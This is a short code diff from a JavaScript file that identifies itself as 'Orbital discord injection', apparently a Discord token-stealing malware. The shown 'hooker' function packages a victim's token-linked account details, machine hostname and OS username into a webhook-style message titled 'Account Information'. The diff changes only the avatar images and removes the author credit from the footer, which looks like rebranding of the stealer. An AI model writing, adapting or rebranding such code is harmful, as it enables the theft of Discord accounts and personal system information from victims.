@@ -148,7 +148,7 @@ const request = async (method, url, headers, data) => {
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "Orbital - injection";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["avatar_url"] = "https://i.pinimg.com/736x/27/10/c2/2710c255f9138991e30fcca164e376fc.jpg";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -156,8 +156,8 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "Orbital discord injection - made by hackirby",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "text": "Orbital discord injection",
+        "icon_url": "https://i.pinimg.com/736x/27/10/c2/2710c255f9138991e30fcca164e376fc.jpg",
     };
     content["embeds"][0]["title"] = "Account Information";
 
